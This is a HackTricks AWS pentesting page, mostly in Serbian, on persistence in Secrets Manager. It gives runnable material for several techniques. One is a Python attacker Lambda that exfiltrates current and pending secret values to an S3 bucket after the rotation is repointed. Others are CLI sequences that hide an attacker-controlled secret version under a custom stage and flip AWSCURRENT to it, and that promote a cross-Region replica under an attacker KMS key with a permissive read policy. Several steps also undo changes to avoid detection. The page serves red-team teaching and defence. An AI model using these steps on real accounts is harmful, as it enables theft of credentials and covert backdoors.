# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Za više informacija pogledajte:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Putem Resource Policies

Moguće je **dodeliti pristup secrets eksternim nalozima** putem resource policies. Pogledajte [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) za više informacija. Imajte na umu da će eksterni nalog, da bi **pristupio secret-u**, takođe **morati imati pristup KMS ključu koji enkriptuje taj secret**.

### Putem Secrets Rotate Lambda

Da bi se automatski **rotate secrets**, poziva se konfigurisana **Lambda**. Ako napadač uspe da **promeni** **kod**, mogao bi direktno **exfiltrate the new secret** sebi.

This is how lambda code for such action could look like:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
{{#include ../../../../banners/hacktricks-training.md}}





### Zamena rotation Lambda za funkciju pod kontrolom napadača putem RotateSecret

Iskoristi `secretsmanager:RotateSecret` da ponovo poveže secret na rotation Lambda pod kontrolom napadača i pokrene trenutnu rotaciju. Zlonamerna funkcija eksfiltrira verzije secreta (AWSCURRENT/AWSPENDING) tokom koraka rotacije (createSecret/setSecret/testSecret/finishSecret) ka destinaciji napadača (npr. S3 ili eksterni HTTP).

- Zahtevi
- Dozvole: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` na napadačkoj Lambdi, `iam:CreateRole/PassRole/PutRolePolicy` (ili AttachRolePolicy) za dodelu execution role Lambdi sa `secretsmanager:GetSecretValue` i po mogućstvu `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (da rotacija nastavi da radi), KMS `kms:Decrypt` za KMS ključ secreta, i `s3:PutObject` (ili outbound egress) za eksfiltraciju.
- Ciljni secret id (`SecretId`) sa omogućenim rotiranjem ili mogućnošću da se rotacija omogući.

- Uticaj
- Napadač dobija vrednost(e) secreta bez izmene legitimnog koda za rotaciju. Promenjena je samo konfiguracija rotacije koja pokazuje na napadačku Lambdu. Ako se ne primeti, zakazane buduće rotacije će i dalje pozivati napadačku funkciju.

- Koraci napada (CLI)
1) Pripremi destinaciju za eksfiltraciju i Lambda execution rolu
- Kreiraj S3 bucket za eksfiltraciju i execution rolu kojoj Lambda veruje, sa dozvolama za čitanje secreta i pisanje u S3 (plus logs/KMS kako je potrebno).
2) Deploy napadačku Lambdu koja pri svakom koraku rotacije preuzme vrednost(e) secreta i upisuje ih u S3. Minimalna logika rotacije može samo kopirati AWSCURRENT u AWSPENDING i promovisati ga u finishSecret da servis ostane funkcionalan.
3) Ponovo poveži rotaciju i pokreni
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) Proveri eksfiltraciju listanjem S3 prefiksa za taj secret i pregledom JSON artefakata.
5) (Opcionalno) Vrati originalnu rotation Lambdu da smanji verovatnoću detekcije.

- Primer napadačke Lamde (Python) koja eksfiltrira u S3
- Environment: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Iskoristite Secrets Manager version staging labels da postavite verziju secreta pod kontrolom napadača i držite je skrivenom pod custom stage-om (na primer, `ATTACKER`) dok produkcija nastavlja da koristi originalni `AWSCURRENT`. U bilo kom trenutku prebacite `AWSCURRENT` na verziju napadača da zatrovate zavisne workloads, pa ga vratite da smanjite šanse za detekciju. Ovo obezbeđuje stealthy backdoor persistence i brzo manipuliranje vremenom upotrebe bez promene imena secreta ili rotacionih podešavanja.

- Zahtevi
- Dozvole: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (za verifikaciju)
- Ciljni secret id u Regionu.

- Uticaj
- Održavajte skrivenu, verziju secreta pod kontrolom napadača i atomarno prebacujte `AWSCURRENT` na nju na zahtev, utičući na bilo kog konzumenta koji rešava isti naziv secreta. Prebacivanje i brzo vraćanje smanjuju šansu za detekciju dok omogućavaju kompromitovanje u trenutku upotrebe.

- Koraci napada (CLI)
- Priprema
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>CLI komande</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Napomene
- Kada navedete `--client-request-token`, Secrets Manager ga koristi kao `VersionId`. Dodavanje nove verzije bez eksplicitnog podešavanja `--version-stages` podrazumevano pomera `AWSCURRENT` na novu verziju i označava prethodnu kao `AWSPREVIOUS`.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

- Iskoristite multi-Region replikaciju Secrets Manager-a da kreirate repliku ciljne tajne u manje nadgledanom Regionu, enkriptujete je KMS ključem pod kontrolom attacker-a u tom Regionu, zatim promovišete repliku u samostalnu tajnu i primenite permisivnu politiku resursa koja attacker-u daje pristup za čitanje. Originalna tajna u primarnom Regionu ostaje nepromenjena, što omogućava trajni, prikriveni pristup vrednosti tajne preko promovisanog replike dok se zaobilaze KMS/policy ograničenja na primarnoj.

- Zahtevi
- Dozvole: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- U Regionu replike: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (or `kms:PutKeyPolicy`) kako bi attacker principal mogao da izvrši `kms:Decrypt`.
- Attacker principal (user/role) koji će dobiti pristup za čitanje promovisanoj tajni.

- Uticaj
- Trajna cross-Region putanja pristupa do vrednosti tajne kroz samostalnu repliku pod attacker-controlled KMS CMK i permisivnom politikom resursa. Primarna tajna u originalnom Regionu ostaje netaknuta.

- Napad (CLI)
- Varijable
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) Kreirajte KMS ključ kojim kontroliše napadač u replica Region
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) Replikujte tajnu na R2 koristeći napadačev KMS ključ
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) Promovišite repliku u samostalnu instancu u R2
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) Priložite permisivnu politiku resursa na samostalnu tajnu u R2
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) Pročitaj secret od attacker principal u R2
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```

